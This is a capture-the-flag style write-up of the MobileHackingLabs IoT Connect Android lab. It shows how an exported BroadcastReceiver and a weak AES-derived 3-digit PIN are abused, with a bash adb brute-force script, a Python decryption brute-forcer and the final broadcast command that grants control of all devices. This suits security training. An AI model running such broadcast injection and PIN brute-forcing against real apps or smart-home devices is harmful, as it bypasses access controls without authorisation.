# MobileHackingLabs - IoT Connect Lab

<figure><img src="./images/articles/android-security-mobilehackinglabs-iot-connect-lab/01.png" alt=""><figcaption></figcaption></figure>

When the **IoT Connect** application opens, the screen shows two windows: one for **Login** and the other for **Register**.\
We can register a new account, but the account we create has very limited permissions , it only has a **Guest** role. For example, I can control the fan,

<figure><img src="./images/articles/android-security-mobilehackinglabs-iot-connect-lab/02.png" alt=""><figcaption></figcaption></figure>

but I cannot control something like the air conditioner or the TV, because that requires a certain 3-digit PIN to gain that privilege and be able to control the whole house.

***

### 1) Analyzing the AndroidManifest.xml

```xml
      <receiver  
            android:name="com.mobilehackinglab.iotconnect.MasterReceiver"  
            android:enabled="true"  
            android:exported="true">  
            <intent-filter>  
                <action android:name="MASTER_ON"/>  
            </intent-filter>  
        </receiver>
```

* This line defines a **static BroadcastReceiver** named `MasterReceiver`.
* `enabled="true"`: the receiver is active.
* `exported="true"`: any external application can send Intents to it.
* `<action android:name="MASTER_ON"/>`: it will be triggered when it receives an Intent with this action.

***

### 2) Analyzing the `onReceive` Method

So now we need to search for `MasterReceiver` because that’s the name of the BroadcastReceiver we saw in the XML,\
or `onReceive`, since that’s the method responsible for receiving and showing what the app does once it gets a broadcast.

<figure><img src="./images/articles/android-security-mobilehackinglabs-iot-connect-lab/03.png" alt=""><figcaption></figcaption></figure>

We found it, and it’s inside:\
**com.mobilehackinglab.iotconnect.CommunicationManager**

Let’s analyze it:

```java
public final BroadcastReceiver initialize(Context context) {  
        Intrinsics.checkNotNullParameter(context, "context");  
        masterReceiver = new BroadcastReceiver() { // from class: com.mobilehackinglab.iotconnect.CommunicationManager.initialize.1  
            @Override // android.content.BroadcastReceiver  
            public void onReceive(Context context2, Intent intent) {  
                if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, "MASTER_ON")) {  
                    int key = intent.getIntExtra("key", 0);  
                    if (context2 != null) {  
                        if (Checker.INSTANCE.check_key(key)) {  
                            CommunicationManager.INSTANCE.turnOnAllDevices(context2);  
                            Toast.makeText(context2, "All devices are turned on", 1).show();  
                        } else {  
                            Toast.makeText(context2, "Wrong PIN!!", 1).show();  
                        }  
                    }  
                }  
            }  
        };
```

This code generates a `BroadcastReceiver` named `masterReceiver`. Its `onReceive` method waits for a broadcast with the action `"MASTER_ON"`.\
When it arrives, it takes an integer value `key` from the Intent, checks it through `Checker.INSTANCE.check_key(key)`.

* If it’s correct → it calls `turnOnAllDevices` and shows a Toast saying **"All devices are turned on"**.
* If it’s wrong → it shows a Toast saying **"Wrong PIN!!"**.

The important thing here is that the method `check_key` is inside the class `Checker`. That’s where the PIN logic is, or at least something that leads us to the PIN.

***

### 3) Analyzing `check_key`

```java
public final class Checker {  
    public static final Checker INSTANCE = new Checker();  
    private static final String algorithm = "AES";  
    private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";  
  
    private Checker() {  
    }  
  
    public final boolean check_key(int key) {  
        try {  
            return Intrinsics.areEqual(decrypt(ds, key), "master_on");  
        } catch (BadPaddingException e) {  
            return false;  
        }  
    }  
  
    public final String decrypt(String ds2, int key) throws BadPaddingException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, InvalidKeyException {  
        Intrinsics.checkNotNullParameter(ds2, "ds");  
        SecretKeySpec secretKey = generateKey(key);  
        Cipher cipher = Cipher.getInstance(algorithm + "/ECB/PKCS5Padding");  
        cipher.init(2, secretKey);  
        if (Build.VERSION.SDK_INT >= 26) {  
            byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));  
            Intrinsics.checkNotNull(decryptedBytes);  
            return new String(decryptedBytes, Charsets.UTF_8);  
        }  
        throw new UnsupportedOperationException("VERSION.SDK_INT < O");  
    }  
  
    private final SecretKeySpec generateKey(int staticKey) {  
        byte[] keyBytes = new byte[16];  
        byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);  
        Intrinsics.checkNotNullExpressionValue(staticKeyBytes, "getBytes(...)");  
        System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));  
        return new SecretKeySpec(keyBytes, algorithm);  
    }  
}
```

***

* The code uses **AES (Advanced Encryption Standard)**, a **symmetric encryption algorithm** (same key for encryption and decryption).
* It uses **PKCS5Padding**: padding scheme that makes data a multiple of 16 bytes (AES block size).

We see a variable `OSnaALIWUkpOziVAMycaZQ==` — that’s the **encrypted value**.

The method:

```java
private final SecretKeySpec generateKey(int staticKey)
```

* The number entered as an integer key is converted to a string (`String.valueOf(key)`), then to bytes.
* Those bytes are placed into a 16-byte array:
  * If the number is short → the rest is padded with `0x00`.
  * If it’s long → it’s truncated to 16 bytes.

And inside `check_key`:

```java
return Intrinsics.areEqual(decrypt(ds, key), "master_on");
```

* It tries to decrypt `ds` with the provided key.
* If the decrypted result equals `"master_on"` → the key is correct.

***

### How to Get the "PIN" Key

We just need to remember:

1. **Command Structure:**\
   `adb shell am broadcast -a [ACTION] --ei [EXTRA_TYPE] [KEY] [VALUE]`
2. **Action:**\
   Must be **-a MASTER\_ON**
3. **Extra Data:**\
   The PIN must be passed as an extra integer (`--ei`) with the name `key` (as seen in the `onReceive` method).

***

#### Method 1: Brute Force Guessing

Since the PIN is only 3 digits (100–999), brute forcing is very feasible.\
We can do this using a simple Bash script:

```bash
#!/bin/bash

for key in $(seq 100 999); do

adb logcat -c

adb shell am broadcast -a MASTER_ON --ei key "$key" > /dev/null 2>&1

sleep 0.2
  
	if adb logcat -d | grep -q "Turning all devices on"; then
		echo "Key found: $key"
		echo "You Are Done"
		break
		
	else
		echo "Key $key -> not correct"
	fi

done

adb logcat -c
```

**Output:**

```
Key 338 -> not correct
Key 339 -> not correct
Key 340 -> not correct
Key 341 -> not correct
Key 342 -> not correct
Key 343 -> not correct
Key 344 -> not correct
Key found: 345
You Are Done
```

***

#### Method 2: Decrypting with Python

```python
from base64 import b64decode
from Crypto.Cipher import AES

ct=b64decode("OSnaALIWUkpOziVAMycaZQ==")
for i in range(111,1000):
    s=str(i).encode(); k=s + b'\x00'*(16-len(s))
    try:
        p=AES.new(k,AES.MODE_ECB).decrypt(ct)
        p=p[:-p[-1]]  # PKCS#5 unpad
        if p.decode()=="master_on":
            print(i); break
    except: pass
```

**Result:** The correct PIN is `345`.

Now we can use the command:

```
adb shell am broadcast -a MASTER_ON --ei key 345
```

<figure><img src="./images/articles/android-security-mobilehackinglabs-iot-connect-lab/04.png" alt=""><figcaption></figcaption></figure>

And with this, we have completed the challenge and gained control over all devices.

***

## Thank you all! I hope you enjoyed the article. If you have any questions, I’m here to help. 

### Remember My name : everythingBlackkk

Made by ❤

Github : <https://github.com/everythingBlackkk>

Linkedin : [www.linkedin.com/in/everythingblackkk](http://www.linkedin.com/in/everythingblackkk)

X : <https://x.com/0xblackkk>

Youtube : <https://www.youtube.com/@everythingBlackkk>
